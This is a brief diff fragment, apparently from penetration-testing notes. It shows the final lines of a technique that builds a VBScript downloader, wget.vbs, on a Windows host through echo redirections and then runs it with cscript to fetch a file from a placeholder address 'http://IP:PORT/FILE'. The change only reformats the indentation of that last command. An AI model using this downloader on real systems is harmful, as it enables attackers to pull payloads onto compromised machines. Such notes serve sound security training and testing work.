@@ -24,4 +24,4 @@ echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vb
 echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
                     
-                    cscript wget.vbs http://IP:PORT/FILE .
+cscript wget.vbs http://IP:PORT/FILE .
